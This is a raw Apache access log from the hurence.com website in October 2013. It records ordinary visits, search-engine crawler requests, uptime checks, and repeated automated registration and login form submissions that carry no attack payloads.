81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/styles/white_paper_logo/public/hadoop-logo.jpg HTTP/1.1" 200 2436 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /modules/file/icons/application-pdf.png HTTP/1.1" 200 639 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /misc/feed.png HTTP/1.1" 200 949 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/all/themes/hurence/images/bg_header.gif HTTP/1.1" 200 559 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/all/themes/hurence/images/bg_header-inner.jpg HTTP/1.1" 200 8925 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/en.jpg HTTP/1.1" 200 3136 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/fr.jpg HTTP/1.1" 200 3176 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/mail.png HTTP/1.1" 200 4030 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/Twitter-24x24.png HTTP/1.1" 200 1869 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:22 +0200] "GET /sites/default/files/Facebook-24x24.png HTTP/1.1" 200 1725 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:48:23 +0200] "GET /sites/default/files/favicon.png HTTP/1.1" 200 3880 "-" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
127.0.0.1 - - [13/Oct/2013:23:48:40 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.17 (Ubuntu) (internal dummy connection)"
81.57.123.104 - - [13/Oct/2013:23:48:42 +0200] "GET /node/100?lang=fr HTTP/1.1" 200 6881 "http://www.hurence.com/node/101?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:49:06 +0200] "GET /node/48?lang=fr HTTP/1.1" 200 6472 "http://www.hurence.com/node/100?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:49:08 +0200] "GET /sites/default/files/hadoop-logo.jpg HTTP/1.1" 200 9739 "http://www.hurence.com/node/48?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
81.57.123.104 - - [13/Oct/2013:23:49:26 +0200] "GET /node/44?lang=fr HTTP/1.1" 200 6631 "http://www.hurence.com/node/48?lang=fr" "Mozilla/5.0 (Linux; Android 4.3; Nexus 4 Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36"
173.63.206.24 - - [13/Oct/2013:23:51:30 +0200] "GET /sites/default/files/What%20is%20Hadoop.pdf HTTP/1.1" 200 692041 "http://www.google.com/search?q=files.cloudera.com+pdf+filetype:pdf&prmd=ivns&ei=uRVbUozWGs_IkAfKtoCYBg&start=40&sa=N" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13"
5.63.145.68 - - [13/Oct/2013:23:57:30 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
79.133.216.99 - - [14/Oct/2013:00:07:17 +0200] "GET /?q=user/register HTTP/1.1" 200 5329 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:18 +0200] "GET /?q=node/add HTTP/1.1" 403 4818 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:18 +0200] "GET /?q=user/register HTTP/1.1" 200 5328 "http://hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:18 +0200] "POST /?q=user/register HTTP/1.1" 302 674 "http://hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:19 +0200] "GET / HTTP/1.1" 200 6712 "http://hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:20 +0200] "GET /?q=user HTTP/1.1" 200 5092 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.216.99 - - [14/Oct/2013:00:07:21 +0200] "POST /?q=user HTTP/1.1" 200 5175 "http://hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.10.83.11 - - [14/Oct/2013:00:11:10 +0200] "GET /node/69 HTTP/1.1" 200 6644 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:00:11:19 +0200] "GET /node/114 HTTP/1.1" 200 6630 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:00:13:49 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
209.85.238.70 - - [14/Oct/2013:00:15:35 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
5.10.83.11 - - [14/Oct/2013:00:16:06 +0200] "GET /node/151?lang=en HTTP/1.1" 200 6157 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
91.229.248.21 - - [14/Oct/2013:00:27:11 +0200] "GET /node/3?lang=fr HTTP/1.0" 200 6841 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:14 +0200] "GET /?q=node/add HTTP/1.0" 403 4782 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:15 +0200] "GET /?q=user/register HTTP/1.0" 200 5326 "http://hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:15 +0200] "POST /?q=user/register HTTP/1.0" 302 674 "http://hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:17 +0200] "GET / HTTP/1.0" 200 6709 "http://hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:19 +0200] "GET /?q=user HTTP/1.0" 200 5091 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
91.229.248.21 - - [14/Oct/2013:00:27:20 +0200] "POST /?q=user HTTP/1.0" 200 5175 "http://hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.63.145.68 - - [14/Oct/2013:00:28:53 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
208.115.113.87 - - [14/Oct/2013:00:40:47 +0200] "GET /robots.txt HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
208.115.113.87 - - [14/Oct/2013:00:40:47 +0200] "GET /robots.txt HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
220.181.108.122 - - [14/Oct/2013:00:42:04 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.31 - - [14/Oct/2013:00:43:37 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.63.145.68 - - [14/Oct/2013:00:44:30 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
46.105.59.74 - - [14/Oct/2013:00:44:54 +0200] "HEAD / HTTP/1.1" 200 468 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36"
66.249.66.213 - - [14/Oct/2013:00:44:59 +0200] "GET /sites/all/themes/hurence/css/megamenu-hurence.css?ls5cse HTTP/1.1" 200 1726 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:00:52:26 +0200] "GET /sites/all/themes/hurence/css/print.css?ls5cse HTTP/1.1" 200 980 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
81.52.143.33 - - [14/Oct/2013:00:56:32 +0200] "GET /node/77 HTTP/1.1" 200 6486 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
5.63.145.68 - - [14/Oct/2013:00:59:44 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
202.46.63.48 - - [14/Oct/2013:01:03:36 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
119.63.193.132 - - [14/Oct/2013:01:04:26 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
89.230.90.18 - - [14/Oct/2013:01:05:01 +0200] "GET / HTTP/1.1" 200 6355 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
209.85.238.70 - - [14/Oct/2013:01:09:55 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
89.230.90.18 - - [14/Oct/2013:01:10:35 +0200] "GET /?q=user HTTP/1.1" 200 5099 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
89.230.90.18 - - [14/Oct/2013:01:10:36 +0200] "POST /?q=user HTTP/1.1" 200 5176 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.10.83.11 - - [14/Oct/2013:01:10:45 +0200] "GET /node/110?lang=fr HTTP/1.1" 200 7089 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:01:12:03 +0200] "GET /node/76 HTTP/1.1" 200 6398 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:01:14:56 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:01:15:49 +0200] "GET /node/78?lang=en HTTP/1.1" 200 6614 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
54.215.252.165 - - [14/Oct/2013:01:21:38 +0200] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.90 Safari/537.1"
54.215.252.165 - - [14/Oct/2013:01:21:40 +0200] "GET / HTTP/1.1" 200 6356 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5"
54.215.252.165 - - [14/Oct/2013:01:21:42 +0200] "GET /node/88 HTTP/1.1" 200 6609 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.90 Safari/537.1"
79.133.200.60 - - [14/Oct/2013:01:27:52 +0200] "GET / HTTP/1.1" 200 6359 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.200.60 - - [14/Oct/2013:01:27:55 +0200] "GET /?q=user HTTP/1.1" 200 5094 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
79.133.200.60 - - [14/Oct/2013:01:27:56 +0200] "POST /?q=user HTTP/1.1" 200 5170 "http://hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.63.145.68 - - [14/Oct/2013:01:30:01 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.135.43.143 - - [14/Oct/2013:01:34:57 +0200] "GET / HTTP/1.1" 200 6362 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:34:59 +0200] "GET /?q=node/add HTTP/1.0" 403 4782 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:35:01 +0200] "GET /?q=user/register HTTP/1.0" 200 5332 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:35:02 +0200] "POST /?q=user/register HTTP/1.0" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:35:03 +0200] "GET / HTTP/1.0" 200 6714 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:35:06 +0200] "GET /?q=user HTTP/1.0" 200 5100 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
198.46.139.152 - - [14/Oct/2013:01:35:07 +0200] "POST /?q=user HTTP/1.0" 200 5176 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
220.181.108.103 - - [14/Oct/2013:01:40:04 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.25 - - [14/Oct/2013:01:40:59 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
208.115.113.87 - - [14/Oct/2013:01:41:10 +0200] "GET /node/109?lang=fr HTTP/1.1" 200 32186 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
208.115.113.87 - - [14/Oct/2013:01:41:22 +0200] "GET /node/42?lang=fr HTTP/1.1" 200 31035 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
5.10.83.11 - - [14/Oct/2013:01:44:24 +0200] "GET /node/47?lang=fr HTTP/1.1" 200 5986 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
91.121.50.223 - - [14/Oct/2013:01:46:43 +0200] "GET /node/3 HTTP/1.1" 200 6675 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:45 +0200] "GET /?q=node/add HTTP/1.1" 403 4822 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:45 +0200] "GET /?q=user/register HTTP/1.1" 200 5327 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:46 +0200] "POST /?q=user/register HTTP/1.1" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:46 +0200] "GET / HTTP/1.1" 200 6716 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:48 +0200] "GET /?q=user HTTP/1.1" 200 5099 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
91.121.50.223 - - [14/Oct/2013:01:46:48 +0200] "POST /?q=user HTTP/1.1" 200 5176 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.63.145.68 - - [14/Oct/2013:01:47:12 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
180.76.5.21 - - [14/Oct/2013:01:49:30 +0200] "GET /node/145?lang=fr HTTP/1.1" 200 6929 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
184.169.201.185 - - [14/Oct/2013:01:51:50 +0200] "GET /rss.xml HTTP/1.1" 200 2945 "-" "Digg Feed Fetcher 1.0 (Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3)"
5.63.145.68 - - [14/Oct/2013:02:02:15 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
209.85.238.70 - - [14/Oct/2013:02:05:45 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
5.10.83.11 - - [14/Oct/2013:02:09:53 +0200] "GET /node/144?lang=en HTTP/1.1" 200 6579 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
188.165.246.158 - - [14/Oct/2013:02:15:01 +0200] "GET / HTTP/1.1" 200 6362 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
95.154.217.193 - - [14/Oct/2013:02:15:03 +0200] "GET /?q=user HTTP/1.0" 200 5099 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
95.154.217.193 - - [14/Oct/2013:02:15:03 +0200] "POST /?q=user HTTP/1.0" 200 5179 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.63.145.68 - - [14/Oct/2013:02:18:21 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
61.135.189.124 - - [14/Oct/2013:02:22:41 +0200] "GET /node/148 HTTP/1.1" 200 6385 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
61.135.189.124 - - [14/Oct/2013:02:23:05 +0200] "GET /node/148 HTTP/1.1" 200 6384 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
199.188.74.105 - - [14/Oct/2013:02:25:26 +0200] "GET / HTTP/1.0" 200 6361 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
199.188.74.105 - - [14/Oct/2013:02:25:29 +0200] "GET /?q=user HTTP/1.0" 200 5098 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
199.188.74.105 - - [14/Oct/2013:02:25:30 +0200] "POST /?q=user HTTP/1.0" 200 5174 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.10.83.11 - - [14/Oct/2013:02:26:29 +0200] "GET /node/37?lang=en HTTP/1.1" 200 6350 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
178.32.232.14 - - [14/Oct/2013:02:27:55 +0200] "GET / HTTP/1.1" 200 6364 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:27:57 +0200] "GET /?q=node/add HTTP/1.0" 403 4784 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:28:00 +0200] "GET /?q=user/register HTTP/1.0" 200 5330 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:28:01 +0200] "POST /?q=user/register HTTP/1.0" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:28:02 +0200] "GET / HTTP/1.0" 200 6714 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:28:05 +0200] "GET /?q=user HTTP/1.0" 200 5098 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
69.175.120.230 - - [14/Oct/2013:02:28:06 +0200] "POST /?q=user HTTP/1.0" 200 5175 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.10.83.11 - - [14/Oct/2013:02:30:21 +0200] "GET /node/10?lang=en HTTP/1.1" 200 6548 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:02:31:16 +0200] "GET /node/58 HTTP/1.1" 200 6781 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:02:32:19 +0200] "GET /node/59 HTTP/1.1" 200 6374 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:02:33:23 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
180.76.5.160 - - [14/Oct/2013:02:37:17 +0200] "GET /sites/all/themes/hurence/css/comments.css?ls5cse HTTP/1.1" 200 982 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.10.83.11 - - [14/Oct/2013:02:40:50 +0200] "GET /node/69 HTTP/1.1" 200 6642 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:02:40:56 +0200] "GET /?lang=fr HTTP/1.1" 200 6647 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
157.55.33.81 - - [14/Oct/2013:02:41:11 +0200] "GET /robots.txt HTTP/1.1" 200 1850 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.59.72 - - [14/Oct/2013:02:42:57 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
119.63.193.130 - - [14/Oct/2013:02:43:02 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.33.81 - - [14/Oct/2013:02:43:21 +0200] "GET /node/135 HTTP/1.1" 200 5446 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
123.125.71.53 - - [14/Oct/2013:02:46:09 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.100 - - [14/Oct/2013:02:46:50 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.63.145.68 - - [14/Oct/2013:02:49:58 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
208.115.111.71 - - [14/Oct/2013:02:51:13 +0200] "GET /robots.txt HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
5.10.83.11 - - [14/Oct/2013:02:51:54 +0200] "GET /node/71 HTTP/1.1" 200 6516 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
217.69.133.248 - - [14/Oct/2013:02:55:44 +0200] "GET /robots.txt HTTP/1.0" 200 1812 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
217.69.133.252 - - [14/Oct/2013:02:55:54 +0200] "GET /node/nutch.apache.org HTTP/1.0" 404 20579 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
209.85.238.70 - - [14/Oct/2013:02:57:25 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
65.19.138.33 - - [14/Oct/2013:03:02:45 +0200] "GET /rss.xml HTTP/1.1" 200 2945 "-" "Feedly/1.0 (+http://www.feedly.com/fetcher.html; like FeedFetcher-Google)"
5.10.83.11 - - [14/Oct/2013:03:02:45 +0200] "GET /node/137 HTTP/1.1" 200 9739 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
188.240.35.66 - - [14/Oct/2013:03:04:21 +0200] "GET / HTTP/1.0" 200 18824 "-" "-"
